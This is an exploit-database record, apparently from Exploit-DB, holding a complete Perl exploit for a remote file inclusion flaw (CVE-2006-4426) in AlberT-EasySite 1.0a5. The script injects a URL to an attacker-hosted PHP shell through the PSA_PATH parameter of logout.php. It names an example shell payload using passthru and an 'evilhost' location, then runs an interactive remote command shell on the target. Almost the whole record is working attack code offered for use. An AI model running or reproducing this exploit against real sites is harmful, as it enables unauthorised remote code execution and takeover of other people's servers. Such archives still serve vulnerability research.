{
  "id": "2260",
  "title": "AlberT-EasySite 1.0a5 - &#039;PSA_PATH&#039; Remote File Inclusion",
  "cve": "CVE-2006-4426",
  "vuln_type": "unknown",
  "code": "#!/usr/bin/perl\r\nuse LWP::UserAgent;\r\n#/*\r\n#+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n#+\r\n#-   - - [DEVIL TEAM THE BEST POLISH TEAM] - -\r\n#+\r\n#+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n#+\r\n#- AES: AlberT-EasySite <= 1.0a5 Remote File Include Vulnerability\r\n#+\r\n#+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n#+\r\n#- [Script name: AES: AlberT-EasySite v. 1.0a5\r\n#- [Script site: http://superalbert.it/download/AlberT-EasySite/\r\n#+\r\n#+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n#+\r\n#-          Find by: Kacper (a.k.a Rahim)\r\n#+\t\t  \r\n#-          Contact: kacper1964@yahoo.pl   \r\n#-                        or   \r\n#-           http://www.rahim.webd.pl/\r\n#+\r\n#+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n#+\r\n#- Special Greetz: DragonHeart ;-)\r\n#- Ema: Leito, Adam, DeathSpeed, Drzewko, pepi, nukedclx\r\n#-\r\n#!@ Przyjazni nie da sie zamienic na marne korzysci @!\r\n#+\r\n#+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n#+\r\n#-            Z Dedykacja dla osoby,\r\n#-         bez ktorej nie mogl bym zyc...\r\n#-           K.C:* J.M (a.k.a Magaja)\r\n#+\r\n#+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n# usage:\r\n# perl exploit.pl <AES Locaction> <shell location> <shell cmd>\r\n#\r\n# perl exploit.pl http://site.com/[AES_Path]/ http://site.com/cmd.txt cmd\r\n#\r\n# cmd shell example: <?passthru($_GET[cmd]);?>\r\n#\r\n# cmd shell variable: ($_GET[cmd]);\r\n#\r\n$sciezka = $ARGV[0];\r\n\r\n$sciezkacmd = $ARGV[1];\r\n\r\n$komenda = $ARGV[2];\r\n\r\nif($sciezka!~/http:\\/\\// || $sciezkacmd!~/http:\\/\\// || !$komenda){usage()}\r\n\r\nhead();\r\n\r\nwhile()\r\n{\r\nprint \"[shell] \\$\";\r\nwhile(<STDIN>)\r\n{\r\n$cmd=$_;\r\nchomp($cmd);\r\n\r\n$xpl = LWP::UserAgent->new() or die;\r\n\r\n$req = HTTP::Request->new(GET=>$sciezka.'AES/modules/auth/phpsecurityadmin/include/logout.php?PSA_PATH='.$sciezkacmd.'?&'.$komenda.'='.$cmd)or die \"\\nCouldNot connect\\n\";\r\n$res = $xpl->request($req);\r\n\r\n$return = $res->content;\r\n$return =~ tr/[\\n]/[&#234;]/;\r\n\r\nif (!$cmd) {print \"\\nEnter a Command\\n\\n\"; $return =\"\";}\r\n\r\nelsif ($return =~/failed to open stream: HTTP request failed!/ || $return =~/: Cannot executea blank command in <b>/)\r\n\r\n{print \"\\nCould Not Connect to cmd Host or Invalid Command Variable\\n\";exit}\r\n\r\nelsif ($return =~/^<br.\\/>.<b>Warning/) {print \"\\nInvalid Command\\n\\n\"}\r\n\r\nif($return =~ /(.+)<br.\\/>.<b>Warning.(.+)<br.\\/>.<b>Warning/)\r\n{\r\n\r\n$finreturn = $1;\r\n$finreturn=~ tr/[&#234;]/[\\n]/;\r\nprint \"\\r\\n$finreturn\\n\\r\";\r\nlast;\r\n\r\n\r\n}\r\nelse {print \"[shell] \\$\";}}}last;\r\n\r\nsub head()\r\n{\r\nprint \"~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\\n\";\r\nprint \"+          - - [DEVIL TEAM THE BEST POLISH TEAM] - -         +\\n\";\r\nprint \"+ AlberT-EasySite <= 1.0a5 Remote File Include Vulnerability +\\n\";\r\nprint \"+                http://www.rahim.webd.pl/                   +\\n\";\r\nprint \"+                Find by: Kacper (a.k.a Rahim)               +\\n\";\r\nprint \"~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\\n\";\r\n}\r\nsub usage()\r\n{\r\nhead();\r\nprint \" Usage: perl exploit.pl <AES Locaction> <shell location> <shell cmd>\\r\\n\\n\";\r\nprint \" <AES Locaction> - Full path to AES ex: http://www.site.com/AES/\\r\\n\";\r\nprint \" <shell location> - Path to cmd Shell e.g http://www.evilhost.com/cmd.txt\\r\\n\";\r\nprint \" <shell cmd> - Command variable used in php shell \\r\\n\";\r\nprint \" ============================================================================\\r\\n\";\r\nprint \"                         Find by: Kacper (a.k.a Rahim)                       \\r\\n\";\r\nprint \"                           http://www.rahim.webd.pl/                         \\r\\n\";\r\nprint \"                          Special Greetz: DragonHeart ;-)                    \\r\\n\";\r\nprint \" ============================================================================\\r\\n\";\r\n\r\nexit();\r\n}\r\n\r\n# milw0rm.com [2006-08-27]",
  "url": "https://www.exploit-db.com/exploits/2260"
}